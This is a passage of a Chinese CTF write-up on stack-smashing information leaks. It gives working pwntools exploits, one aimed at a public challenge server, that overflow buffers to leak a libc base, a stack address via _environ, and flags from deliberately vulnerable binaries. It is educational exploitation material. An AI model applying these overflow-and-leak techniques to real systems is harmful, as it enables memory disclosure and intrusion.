+<p>没有成功，再看代码逻辑。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x40083f:    call   0x4006a0 &lt;_IO_getc@plt&gt;</span><br><span class="line">0x400844:    cmp    eax,0xffffffff</span><br><span class="line">0x400847:    je     0x40089f</span><br><span class="line">0x400849:    cmp    eax,0xa</span><br><span class="line">0x40084c:    je     0x400860</span><br><span class="line">0x40084e:    mov    BYTE PTR [rbx+0x600d20],al</span><br><span class="line">0x400854:    add    rbx,0x1</span><br><span class="line">0x400858:    cmp    rbx,0x20</span><br><span class="line">0x40085c:    jne    0x400838</span><br></pre></td></tr></table></figure></p>
+<p>这是第二次输入的汇编部分，其中执行了mov    BYTE PTR [rbx+0x600d20],al(此时rbx = 0)，也就是byte_600D20[v0++] = v1，这就把byte_600D20变量循环覆盖掉，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwn@pwn-PC:~/Desktop$ python -c &apos;print &quot;A&quot;*536+__import__(&quot;struct&quot;).pack(&quot;&lt;Q&quot;,0x600d20)+&quot;\n&quot;+&quot;BBBB&quot;&apos;|./readme.bin</span><br><span class="line">Hello!</span><br><span class="line">What&apos;s your name? Nice to meet you, AAAAAAA.....</span><br><span class="line">Please overwrite the flag: Thank you, bye!</span><br><span class="line">*** stack smashing detected ***: BBBB terminated</span><br></pre></td></tr></table></figure></p>
+<p>但是当ELF文件比较小的时候，它的不同区段可能会被多次映射，在ELF内存映射的时候，bss段会被映射两次，也就是说flag有备份，我们可以使用另一处的地址进行输出，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ find 32C3</span><br><span class="line">Searching for &apos;32C3&apos; in: None ranges</span><br><span class="line">Found 2 results, display max 2 items:</span><br><span class="line">readme.bin : 0x400d20 (&quot;32C3_TheServerHasTheFlagHere...&quot;)</span><br><span class="line">readme.bin : 0x600d20 (&quot;32C3_TheServerHasTheFlagHere...&quot;)</span><br></pre></td></tr></table></figure></p>
+<p>此时选择0x400d20进行构造payload即可成功打印出来。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwn@pwn-PC:~/Desktop$ python -c &apos;print &quot;A&quot;*536+__import__(&quot;struct&quot;).pack(&quot;&lt;Q&quot;,0x400d20)+&quot;\n&quot;&apos;|./readme.bin</span><br><span class="line">Hello!</span><br><span class="line">What&apos;s your name? Nice to meet you, AAAAAAAA....</span><br><span class="line">Please overwrite the flag: Thank you, bye!</span><br><span class="line">*** stack smashing detected ***: 32C3_TheServerHasTheFlagHere... terminated</span><br><span class="line">段错误</span><br></pre></td></tr></table></figure></p>
+<p>由于题目在远程服务器上，而且LIBC_FATAL_STDERR_=0，这个错误提示只会显示在远端，不会返回到我们这端。因此必须设置如下环境变量LIBC_FATAL_STDERR_=1，才能实现将标准错误信息通过管道输出到远程shell中。因此，我们还必须设置该参数。那么环境变量在哪？有什么用？<br>在<strong>libc_message函数的源代码可以看到LIBC_FATAL_STDERR_使用读取了环境变量</strong>libc_secure_getenv。如果它没有被设置、或者为空（\x00或NULL），那么stderr被重定向到_PATH_TTY（这通常是/dev/tty），因此将错误消息不被发送，只在服务器侧可见。<br>位置在高于<strong>libc_argv[0]内存单元，且在</strong>libc_main[0]地址+8之后。<br>因此exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">env_addr = 0x600d20</span><br><span class="line">flag_addr = 0x400d20</span><br><span class="line"></span><br><span class="line">r = process(&apos;./read.bin&apos;)</span><br><span class="line">r.recvuntil(&quot;What&apos;s your name? &quot;)</span><br><span class="line">r.sendline(&quot;A&quot;*536 + p64(flag_addr) + &quot;A&quot;*8 + p64(env_addr))</span><br><span class="line">r.sendline(&quot;LIBC_FATAL_STDERR_=1&quot;)</span><br><span class="line">r.recvuntil(&quot;*** stack smashing detected ***: &quot;)</span><br><span class="line">log.info(&quot;The flag is: %s&quot; % r.recvuntil(&quot; &quot;).strip())</span><br></pre></td></tr></table></figure></p>
+<p> 本地测试：<br><img src="/image/20200314/image1.png" alt="image"></p>
+<h1 id="题目二"><a href="#题目二" class="headerlink" title="题目二"></a>题目二</h1><p>2018年网鼎杯中guess题目，相对于题目一，flag的位置在栈中而不是bss段，而且ASLR后地址是无法预测的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  __WAIT_STATUS stat_loc; // [rsp+14h] [rbp-8Ch]</span><br><span class="line">  int v5; // [rsp+1Ch] [rbp-84h]</span><br><span class="line">  __int64 v6; // [rsp+20h] [rbp-80h]</span><br><span class="line">  __int64 v7; // [rsp+28h] [rbp-78h]</span><br><span class="line">  char buf; // [rsp+30h] [rbp-70h]</span><br><span class="line">  char s2; // [rsp+60h] [rbp-40h]</span><br><span class="line">  unsigned __int64 v10; // [rsp+98h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(0x28u);</span><br><span class="line">  v7 = 3LL;</span><br><span class="line">  LODWORD(stat_loc.__uptr) = 0;</span><br><span class="line">  v6 = 0LL;</span><br><span class="line">  sub_4009A6();</span><br><span class="line">  HIDWORD(stat_loc.__iptr) = open(&quot;./flag.txt&quot;, 0, a2);</span><br><span class="line">  if ( HIDWORD(stat_loc.__iptr) == -1 )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(&quot;./flag.txt&quot;);</span><br><span class="line">    _exit(-1);</span><br><span class="line">  &#125;</span><br><span class="line">  read(SHIDWORD(stat_loc.__iptr), &amp;buf, 0x30uLL);</span><br><span class="line">  close(SHIDWORD(stat_loc.__iptr));</span><br><span class="line">  puts(&quot;This is GUESS FLAG CHALLENGE!&quot;);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( v6 &gt;= v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;you have no sense... bye :-) &quot;);</span><br><span class="line">      return 0LL;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = sub_400A11();</span><br><span class="line">    if ( !v5 )</span><br><span class="line">      break;</span><br><span class="line">    ++v6;</span><br><span class="line">    wait((__WAIT_STATUS)&amp;stat_loc);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Please type your guessing flag&quot;);</span><br><span class="line">  gets(&amp;s2);</span><br><span class="line">  if ( !strcmp(&amp;buf, &amp;s2) )</span><br><span class="line">    puts(&quot;You must have great six sense!!!! :-o &quot;);</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;You should take more effort to get six sence, and one more challenge!!&quot;);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pwn@pwn-PC:~/Desktop$ checksec GUESS </span><br><span class="line">[*] &apos;/home/pwn/Desktop/GUESS&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure></p>
+<p>先捋一捋流程<br>首先由于使用了gets，因此可以无限制溢出，并且有三次机会。<br>然后发现flag.txt中flag值通过read(SHIDWORD(stat_loc.__iptr), &amp;buf, 0x30uLL)读入到了栈中，&amp;buf处。<br>最后开启了canary，可以使用stack smashing的方法泄漏处flag的值。<br>那么怎样去构造呢？<br>想要获取flag的值，就得获取buf的栈中的地址，因为ASLR的原因，那么需要先泄漏libc的基址，根据偏移去计算出加载后的栈中buf的地址。<br>但是现在问题是得到了libc的的加载地址，怎么算出stack的加载地址，因为每次加载的时候，两者相距的长度变化的。解决的办法就是找一个与stack的加载地址的偏移量不变的参照物，或者说与buf的栈地址偏移量不变的参照物，此参照物可以根据已有的条件计算出实际的加载地址。此时就需要补充一个知识点：在libc中保存了一个函数叫_environ，存的是当前进程的环境变量，_environ指向的位置是栈中环境变量的地址，其中_environ的地址 = libc基址 + _environ的偏移量，也就说在内存布局中，他们同属于一个段，开启ASLR之后相对位置不变，偏移量和libc库有关，_environ的地址(&amp;_environ)和libc基址的偏移量是不会的，并且通过&amp;_environ找到_environ内存单元中的值是栈中环境变量的地址，根据此地址可以找到环境变量。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwn@pwn-PC:~/Desktop$ objdump -d /usr/lib/x86_64-linux-gnu/libc-2.24.so | grep __environ</span><br><span class="line">dc97d:  48 c7 05 c0 f5 2b 00    movq   $0xfff,0x2bf5c0(%rip)        # 39bf48 &lt;__environ@@GLIBC_2.2.5+0x10&gt;</span><br><span class="line">.....</span><br></pre></td></tr></table></figure></p>
+<p>__environ在libc中的偏移量为0x39bf38。<br><img src="/image/20200314/image2.png" alt="image"></p>
+<p>这样一来，栈中_environ的值和buf的栈地址的相对位置是固定的，可以根据_environ的值-偏移量=buf的栈地址。那么程序中这三次输入分别是：<br>第一次，通过泄露函数的got表内容，计算得到libc基址。<br>第二次，通过libc基址和偏移量计算得到&amp;_environ，获取_environ的值。<br>第三次，通过_environ的值，计算出buf的栈地址，泄露buf中存储的flag的值。<br>步骤如下：<br>第一次泄漏libc基址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"># context.arch = &apos;amd64&apos;</span><br><span class="line"># context.log_level = &apos;debug&apos;</span><br><span class="line"># context.terminal = [&apos;deepin-terminal&apos;, &apos;-x&apos;, &apos;sh&apos; ,&apos;-c&apos;]</span><br><span class="line">p = process(&apos;./GUESS&apos;)</span><br><span class="line">elf = ELF(&quot;./GUESS&quot;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">gets_got = elf.got[&apos;gets&apos;]</span><br><span class="line"># print hex(gets_got)</span><br><span class="line">p.recvuntil(&apos;guessing flag\n&apos;)</span><br><span class="line">payload = &apos;a&apos; * 0x128 + p64(gets_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&apos;detected ***: &apos;)</span><br><span class="line">gets_addr = u64(p.recv(6).ljust(0x8,&apos;\x00&apos;))</span><br><span class="line">libc_base_addr = gets_addr - libc.symbols[&apos;gets&apos;]</span><br><span class="line">print &apos;libc_base_addr: &apos; + hex(libc_base_addr)</span><br><span class="line"></span><br><span class="line">pwn@pwn-PC:~/Desktop$ python exp.py </span><br><span class="line">[+] Starting local process &apos;./GUESS&apos;: pid 28733</span><br><span class="line">[*] &apos;/home/pwn/Desktop/GUESS&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">[*] &apos;/lib/x86_64-linux-gnu/libc.so.6&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">libc_base_addr: 0x7ff71434f000</span><br></pre></td></tr></table></figure></p>
+<p>第二次泄漏_environ的值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">environ_addr = libc_base_addr + libc.symbols[&apos;_environ&apos;]</span><br><span class="line"># print &apos;environ_addr: &apos; + hex(environ_addr)</span><br><span class="line">payload1 = &apos;a&apos; * 0x128 + p64(environ_addr)</span><br><span class="line">p.recvuntil(&apos;Please type your guessing flag&apos;)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(&apos;stack smashing detected ***: &apos;)</span><br><span class="line">stack_addr = u64(p.recv(6).ljust(0x8,&apos;\x00&apos;))</span><br><span class="line">print &apos;stack_addr: &apos;+hex(stack_addr)</span><br><span class="line"></span><br><span class="line">pwn@pwn-PC:~/Desktop$ python exp.py </span><br><span class="line">[+] Starting local process &apos;./GUESS&apos;: pid 29707</span><br><span class="line">[*] &apos;/home/pwn/Desktop/GUESS&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">[*] &apos;/lib/x86_64-linux-gnu/libc.so.6&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">libc_base_addr: 0x7f8d02122000</span><br><span class="line">stack_addr: 0x7ffc5a61c908</span><br></pre></td></tr></table></figure></p>
+<p>第三次泄漏flag的值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">计算出stack_addr和buf_addr的相距长度</span><br><span class="line">pwndbg&gt; distance 0x7fffffffcca0 0x7fffffffce08</span><br><span class="line">0x7fffffffcca0-&gt;0x7fffffffce08 is 0x168 bytes (0x2d words)</span><br><span class="line"></span><br><span class="line">payload2 = &apos;a&apos; * 0x128 + p64(stack_addr - 0x168)</span><br><span class="line">p.recvuntil(&apos;Please type your guessing flag&apos;)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.recvuntil(&apos;stack smashing detected ***: &apos;)</span><br><span class="line">flag = p.recvline()</span><br><span class="line">print &apos;flag:&apos; + flag</span><br><span class="line"></span><br><span class="line">pwn@pwn-PC:~/Desktop$ python exp.py </span><br><span class="line">[+] Starting local process &apos;./GUESS&apos;: pid 29877</span><br><span class="line">[*] &apos;/home/pwn/Desktop/GUESS&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">[*] &apos;/lib/x86_64-linux-gnu/libc.so.6&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">libc_base_addr: 0x7f8d02122000</span><br><span class="line">stack_addr: 0x7ffc5a61c908</span><br><span class="line">flag: flag&#123;stack_smash&#125;</span><br></pre></td></tr></table></figure></p>
+<p>exp:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"># context.arch = &apos;amd64&apos;</span><br><span class="line"># context.log_level = &apos;debug&apos;</span><br><span class="line"># context.terminal = [&apos;deepin-terminal&apos;, &apos;-x&apos;, &apos;sh&apos; ,&apos;-c&apos;]</span><br><span class="line">p = process(&apos;./GUESS&apos;)</span><br><span class="line">elf = ELF(&quot;./GUESS&quot;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">gets_got = elf.got[&apos;gets&apos;]</span><br><span class="line"># print hex(gets_got)</span><br><span class="line">p.recvuntil(&apos;guessing flag\n&apos;)</span><br><span class="line">payload = &apos;a&apos; * 0x128 + p64(gets_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&apos;detected ***: &apos;)</span><br><span class="line">gets_addr = u64(p.recv(6).ljust(0x8,&apos;\x00&apos;))</span><br><span class="line">libc_base_addr = gets_addr - libc.symbols[&apos;gets&apos;]</span><br><span class="line">print &apos;libc_base_addr: &apos; + hex(libc_base_addr)</span><br><span class="line"></span><br><span class="line">environ_addr = libc_base_addr + libc.symbols[&apos;_environ&apos;]</span><br><span class="line"># print &apos;environ_addr: &apos; + hex(environ_addr)</span><br><span class="line">payload1 = &apos;a&apos; * 0x128 + p64(environ_addr)</span><br><span class="line">p.recvuntil(&apos;Please type your guessing flag&apos;)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(&apos;stack smashing detected ***: &apos;)</span><br><span class="line">stack_addr = u64(p.recv(6).ljust(0x8,&apos;\x00&apos;))</span><br><span class="line">print &apos;stack_addr: &apos;+hex(stack_addr)</span><br><span class="line"></span><br><span class="line">payload2 = &apos;a&apos; * 0x128 + p64(stack_addr - 0x168)</span><br><span class="line">p.recvuntil(&apos;Please type your guessing flag&apos;)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.recvuntil(&apos;stack smashing detected ***: &apos;)</span><br><span class="line">flag = p.recvline()</span><br><span class="line">print &apos;flag:&apos; + flag</span><br></pre></td></tr></table></figure></p>
+<h1 id="题目三"><a href="#题目三" class="headerlink" title="题目三"></a>题目三</h1><p>Jarvis OJ中的smashes，与题目一一样，但是可以直接在本地显示错误信息，只是提供了一个复现场景<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwn@pwn-PC:~/Desktop$ python -c &apos;print &quot;A&quot;*536+__import__(&quot;struct&quot;).pack(&quot;&lt;Q&quot;,0x400d20) + &quot;\n&quot;&apos;|./smashes.44838f6edd4408a53feb2e2bbfe5b229 </span><br><span class="line">Hello!</span><br><span class="line">What&apos;s your name? Nice to meet you, AAAAAA..... </span><br><span class="line">Please overwrite the flag: Thank you, bye!</span><br><span class="line">*** stack smashing detected ***: PCTF&#123;Here&apos;s the flag on server&#125; terminated</span><br></pre></td></tr></table></figure></p>
+<p>exp:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=remote(&quot;pwn.jarvisoj.com&quot;,&quot;9877&quot;)</span><br><span class="line">p.recvuntil(&quot;name?&quot;);</span><br><span class="line">flag_addr=0x400d20                                                                                                 </span><br><span class="line">payload=&apos;a&apos;*0x218+p64(flag_addr)+&apos;\n&apos;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&apos;stack smashing detected ***: &apos;)</span><br><span class="line">flag = p.recvline()</span><br><span class="line">print flag</span><br><span class="line"></span><br><span class="line">pwn@pwn-PC:~/Desktop$ python exp.py </span><br><span class="line">[+] Opening connection to pwn.jarvisoj.com on port 9877: Done</span><br><span class="line">PCTF&#123;57dErr_Smasher_good_work!&#125; terminated</span><br><span class="line"></span><br><span class="line">[*] Closed connection to pwn.jarvisoj.com port 9877</span><br><span class="line">`</span><br></pre></td></tr></table></figure></p>
+<h1 id="题目四"><a href="#题目四" class="headerlink" title="题目四"></a>题目四</h1><p>main函数中存在栈溢出，源码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; // [rsp+18h] [rbp-118h]</span><br><span class="line">  char v5; // [rsp+20h] [rbp-110h]</span><br><span class="line">  char v6; // [rsp+A0h] [rbp-90h]</span><br><span class="line">  unsigned __int64 v7; // [rsp+128h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(0x28u);</span><br><span class="line">  putenv(&quot;LIBC_FATAL_STDERR_=1&quot;, argv, envp);</span><br><span class="line">  v4 = fopen64(&quot;flag.txt&quot;, &quot;r&quot;);</span><br><span class="line">  if ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    fgets(&amp;v5, 32LL, v4);</span><br><span class="line">    fclose(v4);</span><br><span class="line">    printf((unsigned __int64)&quot;Interesting data loaded at %p\nYour username? &quot;);</span><br><span class="line">    fflush(0LL, &amp;v5);</span><br><span class="line">    read(0LL, &amp;v6, 1024LL);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Error leyendo datos&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pwn@pwn-PC:~/Desktop$ checksec xpl</span><br><span class="line">[*] &apos;/home/pwn/Desktop/xpl&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">          0x400000           0x4c0000 r-xp    c0000 0      /home/pwn/Desktop/xpl</span><br><span class="line">          0x6bf000           0x6c2000 rw-p     3000 bf000  /home/pwn/Desktop/xpl</span><br><span class="line">          0x6c2000           0x6e8000 rw-p    26000 0      [heap]</span><br><span class="line">    0x7ffff7ffa000     0x7ffff7ffd000 r--p     3000 0      [vvar]</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7fff000 r-xp     2000 0      [vdso]</span><br><span class="line">    0x7ffffffdd000     0x7ffffffff000 rw-p    22000 0      [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]</span><br></pre></td></tr></table></figure></p>
+<p>开启了ASLR，并且可以知道程序将flag.txt的flag值存放在了char v5 //[rsp+20h] [rbp-110h]中，这看起来与题目二相似，可以使用其思路，但是vmmap发现这没有动态编译，那么此思路就pass掉，再去找其他的办法，百思不得其解时，运行一下程序，发现会输出一个地址，回过头去看代码才发现因自己的知识储备太少，没有注意到prinf的中%p的是匹配的哪。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pwn@pwn-PC:~/Desktop$ ./xpl </span><br><span class="line">Interesting data loaded at 0x7ffe65dfcfd0</span><br><span class="line">Your username? </span><br><span class="line"></span><br><span class="line">源码：</span><br><span class="line"> printf((unsigned __int64)&quot;Interesting data loaded at %p\nYour username? &quot;);</span><br><span class="line"></span><br><span class="line">调试：</span><br><span class="line">   0x4010d9 &lt;main+123&gt;    lea    rax, [rbp - 0x110]</span><br><span class="line">   0x4010e0 &lt;main+130&gt;    mov    rsi, rax</span><br><span class="line">   0x4010e3 &lt;main+133&gt;    mov    edi, 0x493b28</span><br><span class="line">   0x4010e8 &lt;main+138&gt;    mov    eax, 0</span><br><span class="line"> ► 0x4010ed &lt;main+143&gt;    call   printf &lt;0x408770&gt;</span><br><span class="line">        format: 0x493b28 ◂— &apos;Interesting data loaded at %p\nYour username? &apos;</span><br><span class="line">        vararg: 0x7fffffffcc00 ◂— &apos;flag&#123;stack_smash&#125;\n&apos;</span><br><span class="line"> </span><br><span class="line">   0x4010f2 &lt;main+148&gt;    mov    edi, 0</span><br><span class="line">   0x4010f7 &lt;main+153&gt;    call   fflush &lt;0x408c90&gt;</span><br><span class="line"> </span><br><span class="line">   0x4010fc &lt;main+158&gt;    lea    rax, [rbp - 0x90]</span><br><span class="line">   0x401103 &lt;main+165&gt;    mov    edx, 